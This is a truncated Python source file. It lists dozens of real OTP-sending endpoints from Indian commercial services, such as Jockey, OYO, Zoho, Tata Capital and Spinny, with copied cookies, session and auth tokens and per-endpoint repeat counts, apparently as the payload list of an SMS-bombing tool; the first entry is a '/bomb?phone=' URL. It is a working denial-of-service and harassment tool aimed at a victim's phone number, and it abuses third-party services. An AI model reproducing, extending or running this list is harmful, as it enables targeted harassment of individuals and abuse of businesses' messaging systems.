import json
import random

apis = [
{
        "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 100
    },
{
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"}),
        "count": 10
    },
{
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data": lambda phone: json.dumps({
            "phoneNumber": phone,
            "authVerificationType": "otp",
            "device": {
                "id": "A1pKVEDhlv66KLtoYsml3",
                "platform": "Chrome",
                "type": "Desktop"
            },
            "countryCode": "+91"
        }),
        "count": 10
    },
{
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.jockey.in",
            "referer": "https://www.jockey.in/",
            "cookie": "localization=IN; _shopify_y=6556c530-8773-4176-99cf-f587f9f00905; _tracking_consent=3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ; _ga=GA1.1.377231092.1757430108; _fbp=fb.1.1757430108545.190427387735094641; _quinn-sessionid=a2465823-ceb3-4519-9f8d-2a25035dfccd; cart=hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06; wishlist_id=7531056362789hypmaaup; wishlist_customer_id=0; _shopify_s=d4985de8-eb08-47a0-9f41-84adb52e6298"
        },
        "data": None,
        "count": 10
    },
{
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "gk-merchant-id": "19g6im8srkz9y",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country": "IN"}),
        "count": 10
    },
{
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({
            "phone_number": phone,
            "short": True,
            "country_code": "+91",
            "medium": ""
        }),
        "count": 10
    },
{
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "content-type": "application/json",
            "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.pw.live",
            "referer": "https://www.pw.live/"
        },
        "data": lambda phone: json.dumps({
            "mobile": phone,
            "organizationId": "5eb393ee95fab7468a79d189"
        }),
        "count": 10
    },
{
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone}),
        "count": 12
    },
{
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.licious.in",
            "Referer": "https://www.licious.in/",
            "Cookie": f"_ga=GA1.1.{random.randint(111111111,999999999)}.{random.randint(1111111111,1999999999)}; _fbp=fb.1.{random.randint(1111111111111,1999999999999)}",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 12
    },
{
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.bisleri.com",
            "Referer": "https://www.bisleri.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"email": f"user{random.randint(1000,9999)}@gmail.com", "mobile": phone}),
        "count": 10
    },
{
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://www.oyorooms.com",
            "Referer": "https://www.oyorooms.com/",
            "Cookie": "user_id=none; country_code=IN; language=en;",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4}),
        "count": 8
    },
{
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}",
        "method": "GET",
        "headers": {
            "Accept": "*/*",
            "Origin": "https://bellavitaorganic.com",
            "Referer": "https://bellavitaorganic.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 8
    },
{
        "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "priority": "u=1, i",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f",
            "referer": "https://www.pw.live/",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "subOrgId": "SUB-PWLI000"}),
        "count": 5
    },
{
        "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "Origin": "https://www.zoho.com",
            "Referer": "https://www.zoho.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": None,
        "count": 500
    },
{
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
        "method": "POST",
        "headers": {
            "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587",
            "x-app-version": "3.0.3",
            "x-user-journey-id": "7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}}),
        "count": 20
    },
{
        "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "shell#lang=en; ASP.NET_SessionId=nyoubocr2b4vz3iv2ahat3xs; ARRAffinity=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; ARRAffinitySameSite=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; _gcl_aw=GCL.1728839037.EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE; _gcl_gs=2.1.k1$i1728839026$u150997757; _gcl_au=1.1.486755895.1728839037; _ga=GA1.1.694452391.1728839040; sts=eyJzaWQiOjE3Mjg4MzkwNDA3MjgsInR4IjoxNzI4ODM5MDQwNzI4LCJ1cmwiOiJodHRwcyUzQSUyRiUyRnVkeW9ncGx1cy5hZGl0eWFiaXJsYWNhcGl0YWwuY29tJTJGc2lnbnVwLWNvYnJhbmRlZCUzRnVybCUzRCUyRiUyNnV0bV9zb3VyY2UlM0REZW50c3Vnb29nbGUlMjZ1dG1fY2FtcGFpZ24lM0R0cmF2ZWxfcG1heCUyNnV0bV9tZWRpdW0lM0QlMjZ1dG1fY29udGVudCUzRGtscmFodWwlMjZqb3VybmV5JTNEcGwlMjZnYWRfc291cmNlJTNEMSUyNmdjbGlkJTNERUFJYUlRb2JDaE1Jclk2bDh1bUxpUU1WNUtobUFoMVRhQTBvRUFNWUFTQUFFZ0o0cGZEX0J3RSIsInBldCI6MTcyODgzOTA0MDcyOCwic2V0IjoxNzI4ODM5MDQwNzI4fQ==; stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5YTdmMGYyZC01NDJjLTRiNTEtYWEwNC01NzAwMjRlN2M4YjAifQ==; stgeo=IjAi; stbpnenable=MA==; __stdf=MA==; _ga_4CYZ07WNGN=GS1.1.1728839040.1.0.1728839049.51.0.0",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded?url=/&utm_source=Dentsugoogle&utm_campaign=travel_pmax&utm_medium=&utm_content=klrahul&journey=pl&gad_source=1&gclid=EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"MobileNumber={phone}&functionality=signup",
        "count": 1
    },
{
        "url": "https://www.muthootfinance.com/smsapi.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; _gcl_au=1.1.289346829.1728838221; _ga_S5CNT4BSQC=GS1.1.1728838222.1.0.1728838222.60.0.0; _ga=GA1.2.273797446.1728838222; _gid=GA1.2.1628453949.1728838223; _gat_UA-38238796-1=1; _fbp=fb.1.1728838224699.885355239931807707; toasterClosedOnce=true",
            "origin": "https://www.muthootfinance.com",
            "priority": "u=1, i",
            "referer": "https://www.muthootfinance.com/personal-loan",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3",
        "count": 3
    },
{
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "cookie": "_ga=GA1.2.1154421870.1728838134; _gid=GA1.2.883266871.1728838135; _gat_UA-96384581-2=1; WZRK_G=1acba64bbe41434abc9c3d3d5645deeb; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1728838134%2C%22t%22%3A1728838134%7D; _uetsid=0982d4e0898311ef9e26c943f5765261; _uetvid=09833b40898311efb6d4f32471c8cf05; _ga_4S93MBNNX8=GS1.2.1728838135.1.0.1728838140.55.0.0; _ga_F7R96SWGCB=GS1.1.1728838134.1.1.1728838140.0.0.0",
            "origin": "https://www.gopaysense.com",
            "priority": "u=1, i",
            "referer": "https://www.gopaysense.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
{
        "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "gclid=undefined; AKA_A2=A",
            "origin": "https://www.iifl.com",
            "priority": "u=1, i",
            "referer": "https://www.iifl.com/personal-loans",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1&utm_source=&utm_medium=&utm_campaign=&utm_content=&utm_term=&campaign=&gclid=&lead_id=&redirect_url=&form_build_id=form-FvvMqggkrdM-07pMIIyAElAcaj_kGjCMOS5UHKh_vUc&form_id=webform_submission_muti_step_lead_gen_form_node_66_add_form&_triggering_element_name=op&_triggering_element_value=Apply+Now&_drupal_ajax=1&ajax_page_state%5Btheme%5D=iifl_finance&ajax_page_state%5Btheme_token%5D=&ajax_page_state%5Blibraries%5D=bootstrap_barrio%2Fglobal-styling%2Cclientside_validation_jquery%2Fcv.jquery.ckeditor%2Cclientside_validation_jquery%2Fcv.jquery.ife%2Cclientside_validation_jquery%2Fcv.jquery.validate%2Cclientside_validation_jquery%2Fcv.pattern.method%2Ccore%2Fdrupal.autocomplete%2Ccore%2Fdrupal.collapse%2Ccore%2Fdrupal.states%2Ccore%2Finternal.jquery.form%2Ceu_cookie_compliance%2Feu_cookie_compliance_default%2Ciifl_crm_api%2Fglobal-styling%2Ciifl_crm_api%2Fgold-global-styling%2Ciifl_finance%2Fbootstrap%2Ciifl_finance%2Fbreadcrumb%2Ciifl_finance%2Fdailyhunt-pixel%2Ciifl_finance%2Fdatalayer%2Ciifl_finance%2Fglobal-styling%2Ciifl_finance%2Fpersonal-loan%2Ciifl_finance_common%2Fglobal%2Cnode_like_dislike_field%2Fnode_like_dislike_field%2Cparagraphs%2Fdrupal.paragraphs.unpublished%2Csearch_autocomplete%2Ftheme.minimal.css%2Csystem%2Fbase%2Cviews%2Fviews.module%2Cwebform%2Fwebform.ajax%2Cwebform%2Fwebform.composite%2Cwebform%2Fwebform.dialog%2Cwebform%2Fwebform.element.details%2Cwebform%2Fwebform.element.details.save%2Cwebform%2Fwebform.element.details.toggle%2Cwebform%2Fwebform.element.message%2Cwebform%2Fwebform.element.options%2Cwebform%2Fwebform.element.select%2Cwebform%2Fwebform.form",
        "count": 5
    },
{
        "url": "https://v2-api.bankopen.co/users/register/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "baggage": "sentry-environment=prod,sentry-release=app-open-money%405.2.0,sentry-public_key=76093829eb3048de9926891ff8e44fac,sentry-trace_id=a17bb4c75de741ffa0998329abf41310",
            "content-type": "application/json",
            "origin": "https://app.opencapital.co.in",
            "priority": "u=1, i",
            "referer": "https://app.opencapital.co.in/en/onboarding/register?utm_source=google&utm_medium=cpc&utm_campaign=IYD_MaxTesting&utm_term=&utm_placement=&gad_source=1&gclid=EAIaIQobChMIo_vwi96LiQMVQaVmAh27cAhXEAAYAiAAEgIkAPD_BwE",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sentry-trace": "a17bb4c75de741ffa0998329abf41310-bc065941fd22d33d-1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-api-version": "3.1",
            "x-client-type": "Web"
        },
        "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1}),
        "count": 5
    },
{
        "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "priority": "u=0, i",
            "referer": "https://www.tatacapital.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({
            "header": {
                "authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                "identifier": "nli"
            },
            "body": {
                "mobileNumber": phone
            }
        }),
        "count": 40
    },
{
        "url": "https://apis.tradeindia.com/app_login_api/login_app",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "client_remote_address": "10.0.2.16",
            "content-type": "application/json",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/4.11.0"
        },
        "data": lambda phone: json.dumps({"mobile": f"+91{phone}"}),
        "count": 3
    },
{
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {
            "x-kb-app-name": "khatabook",
            "x-kb-app-version": "801800",
            "x-kb-app-locale": "en",
            "x-kb-platform": "android",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.10.0"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "app_signature": "wk+avHrHZf2"}),
        "count": 20
    },
{
        "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.orangehealth.in",
            "priority": "u=1, i",
            "referer": "https://www.orangehealth.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": phone, "customer_auto_fetch_message": True}),
        "count": 3
    },
{
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "priority": "u=1, i",
            "referer": "https://www.jobhai.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "source": "WEB",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-transaction-id": "JS-WEB-89b40679-56c2-4c0e-926e-0fafca8a84f3"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
{
        "url": "https://mconnect.isteer.co/mconnect/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app_platform": "mvaahna",
            "content-type": "application/json",
            "origin": "https://mvaahna.com",
            "priority": "u=1, i",
            "referer": "https://mvaahna.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"}),
        "count": 50
    },
{
        "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank&_=1719472121119",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": "_gid=GA1.2.1239008246.1719472125; _gat_gtag_UA_245702_1=1; _ga=GA1.1.1226959669.1719472122; _ga_1C0W65RV19=GS1.1.1719472121.1.1.1719472138.0.0.0; _ga_0VL2HF4X5B=GS1.1.1719472125.1.1.1719472138.47.0.0",
            "referer": "https://www.astrosage.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "script",
            "sec-fetch-mode": "no-cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 3
    },
{
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "varnishPrefixHome=false; utm_source=SPD-Search-Top8-National-Brand-EM-Home; utm_medium=gads_c_search; platform=web; _gcl_gs=2.1.k1$i1719310791; _gcl_au=1.1.1890033919.1719310798; _gcl_aw=GCL.1719310800.EAIaIQobChMI5dC558P2hgMVUhaDAx2-3AwcEAAYASAAEgJXUvD_BwE; _ga=GA1.1.1822449614.1719310800; _fbp=fb.1.1719310801079.320900520174536436; _ga_WQREN8TJ7R=GS1.1.1719310799.1.1.1719310837.22.0.0",
            "origin": "https://www.spinny.com",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://www.spinny.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA4vFfvSahNObwINE1dnN-C8rahsbSbuh4fqeqcBJ82qWMuwus56lEKOYaUxj8u0opIAA7co7oDhBaTuIHM-Do3wgKmbo68rCKnvtFpPHiKiEpmKQhPcjvAT_6_y-2iyj_DR80S5npM-jXnNMoFS92SJQYvjGBbWFD9lFiFEgbnAWMBxUwNVyacx1gVszD7HvqC_nLDISnnqi7iWBjoYDJgTUg5iqds1DA-KYxbtEDtcpKgBi6Em34U4GG1ggZoKijC-k8qy1lInhWqo-xK6EY6acXydcGHKgXzWrsdHG2aciibuozN-3ZAWNfN0GsFfU4L1os4pe4ruCW1rEAuDJ3HT5ojiD5iiUUg4OBcJkUHCu2LSTBrTacO8PHH4PT5ruV-rvZyNVvAuX5xDcJea1NBUYyMitVtK0Lf1M75e3k3XL6K1MTq3QDDPXJlrStTSrB6qZ-m3n9Tf6sCnDZ0jcRoMtHU414MzHym3Itswbj5YuJM8wcn5aAnvvBv7UGskct4Jz4ZyJdcC5cS8AzYNSmyAS3JawN644RVl59KaNGsuYt9Ls7o2UtWhkIwlIsIBukVZW35yTaGNUhEWaRrDD-3BfUwKtloJItM2En2_nuI3f71HfTVI-I0dY6kTrMRuYfCGaz67jZiekSSIuOxenxVxp1BcG6rEO-zx-fRM_gMyDuiKGTmq98l-lPIfhSUFRXtloNr_qcKp1m6_jpzrfIi8M6UhiCYcnQCmNv19MAA8BWnEiyPPI_-FGh12jp22OCGA0mcoqGNadE6w-IezHN8fi6aWBAPRgEYf42XPv5oWiVa0ykvHg0MZKChb7n3Avk_ADibr632go3SVIIfXrFUgbWsUDLocd1WBkpeaUyKlKSqisbjKqHpxFMMaJGcjapUDstT1EMFINhNUCgowcKTY5zGMm9W9R9N48Ouxgyin2c7_0LmS5wPj3onP9yOJ8E6GL3aMKhtcxn4lXfxymyB1VFMzMMD-sAfkVoMliWhsludZWTOhuSXUE75SYxfDjrOQTlu6oRrda8QbMpR7Hv2qK2NjnrlNx4Qq2wSR0w56-Qtlif5gfFrD0U_TI7OH-yVcj45v_p0jGdoJ2Zh_6oFip5fSnSgdzXhSoGAKEVbm6NGrIGYiWLj6o-fnZrzpfRvqaS9NedG3qjr0p94lVFSeiW0s0BK0KpDWlwY4C7nbeqLkjk55tabY9B_nZjN7IXmJKNv46tZqMJVZJW37z7xV9aBQ17VARz8_UgluqS97i-NwsLuwWMZpCNpJeYGRVIKFSJtN1l3LutO1USLkYU9Or9fPEPPSOpG0fDbaFnK2QVruku8XnhvEYGHHEM0mFGcJK1-Eds95wA1c3P0Hr6DLfW7k3JKjQx_hJm719-w-UwsOYqZccz1Sh00-dmGlSJsrgOljgPOD8ZVca4Xso92P-W3NxnNEZLO45IjzTIkB1ItKYEDG7V1b4ixqw36J_lkPt7ekLvFMhcvNZkyIWTpI42Ag7ALnn6P3SfWAZwkrGXry6LPikOJz1zB5FdzEtUuF9_EO-YjzBRr1pv9ZmbSbdT2MOJv3rQ40GREvbIIfd_BA_zSyPl7HSe8QMlBksjHapVfBE_jNtcakDVSWdE6CBZjPksgIUIv6yzC0LWZA1h6v4mX-K85hmIb01UnPtnTMD_7o4K79JzYgk4gFLBxjTZVyKvBhFpVhCcq7ePBWiO8LPDbaF6R7uSF8ZgrRunZbrEMrnLBqx6EKrdtJGgN2q8VFCDjNeQJH3CuYuOISzE_rPfc", "expected_action": "login"}),
        "count": 3
    },
{
